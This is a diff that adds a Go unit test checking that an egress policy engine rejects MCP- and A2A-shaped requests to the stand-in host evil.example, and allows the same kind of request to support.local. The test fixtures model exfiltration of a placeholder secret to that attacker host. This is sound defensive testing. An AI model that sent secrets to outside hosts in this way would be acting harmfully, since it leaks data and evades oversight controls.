@@ -204,3 +204,21 @@ func TestEnginePrincipalNotInjectedInbound(t *testing.T) {
 		t.Fatalf("inbound tool call: action = %v, want reject (no principal)", a.Type)
 	}
 }
+
+// A body shaped as an MCP protocol method or an A2A message is still
+// egress: it is held to the host allowlist like any other.
+func TestEngineEgressCoversParsedProtocolMechanics(t *testing.T) {
+	p := egressEngine(t)
+	ctx := context.Background()
+	mcp := egressRequest("POST", "evil.example", "/projects/A/x", `{"jsonrpc":"2.0","method":"tools/list","params":{"cursor":"s3cr3t"}}`, nil)
+	mcp.Extensions.MCP = &pipeline.MCPExtension{Method: "tools/list", Params: map[string]any{"cursor": "s3cr3t"}}
+	wantReject(t, "mcp tools/list to evil.example", p.OnRequest(ctx, mcp), "cpex.egress_host")
+
+	a2a := egressRequest("POST", "evil.example", "/projects/A/x", `{"jsonrpc":"2.0","method":"message/send"}`, nil)
+	a2a.Extensions.A2A = &pipeline.A2AExtension{Method: "message/send", Parts: []pipeline.A2APart{{Kind: "text", Content: "s3cr3t"}}}
+	wantReject(t, "a2a to evil.example", p.OnRequest(ctx, a2a), "cpex.egress_host")
+
+	ok := egressRequest("POST", "support.local", "/projects/A/x", `{"jsonrpc":"2.0","method":"tools/list"}`, nil)
+	ok.Extensions.MCP = &pipeline.MCPExtension{Method: "tools/list"}
+	wantContinue(t, "mcp tools/list to support.local", p.OnRequest(ctx, ok))
+}
